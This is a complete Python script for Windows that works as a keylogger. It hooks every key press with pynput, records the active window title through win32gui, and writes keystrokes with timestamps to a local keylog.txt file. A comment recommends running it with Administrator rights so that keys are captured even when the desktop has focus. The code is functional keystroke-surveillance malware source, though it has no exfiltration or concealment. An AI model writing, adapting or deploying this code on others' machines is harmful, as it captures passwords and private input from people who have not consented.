import logging
import datetime
import os
from pynput import keyboard
from pathlib import Path
import win32gui  #interacting with the windows gui


# config
# On Windows: to capture keys when the DESKTOP has focus, run this script as Administrator
# (UIPI blocks low-level hooks for non-elevated processes when Explorer/Desktop is foreground).

BASE_DIR = Path(__file__).resolve().parent
LOG_FILE = BASE_DIR / "keylog.txt"

# setup logging
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.DEBUG,
    format="%(message)s"
)

# check the active window
def get_active_window():
    """Returns the title of the currently focused window."""
    try:
        return win32gui.GetWindowText(win32gui.GetForegroundWindow())
    except:
        return "Unknown"

current_window = "" 

def on_press(key):
    if key == keyboard.Key.esc:
        return False
        
    global current_window

    # Check if the user switched windows
    active = get_active_window()
    if active != current_window:
        current_window = active #update the current window
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        logging.info(f"\n\n[{timestamp}] Window: {active}")
    

    # Log the key
    try:
        logging.info(f"{key.char}")          # regular character (character is the key pressed)         
    except AttributeError:
        logging.info(f"[{key}]")             # special key e.g. [Key.space]

# main
def start():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start()